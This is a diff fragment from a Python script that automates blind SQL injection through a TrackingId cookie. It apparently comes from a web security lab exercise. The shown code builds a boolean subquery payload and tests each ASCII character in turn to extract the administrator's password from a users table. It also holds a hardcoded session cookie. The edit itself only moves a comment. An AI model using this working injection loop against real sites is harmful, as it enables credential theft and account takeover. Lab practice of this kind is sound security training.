@@ -13,8 +13,8 @@ def retrieve_password(url):
         for ascii_char in range(33,127): # Try the decimal numbers for each char from the ASCII table.
             payload =f"' AND (SELECT ASCII(SUBSTRING(password,{number},1)) FROM users WHERE username='administrator')={ascii_char}--"
             print(colored("hello","green"))
-            cookies={
-                "TrackingId": "2uFM62rGof2FsWEZ" + payload, # You must change it and set the cookies of your request.
+            cookies={  # You must change it and set the cookies of your request.
+                "TrackingId": "2uFM62rGof2FsWEZ" + payload,
                 "session": "3TzQGczPRWLnOmNypH0tRYU1LgFLhBuy"
                 }
             response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy)
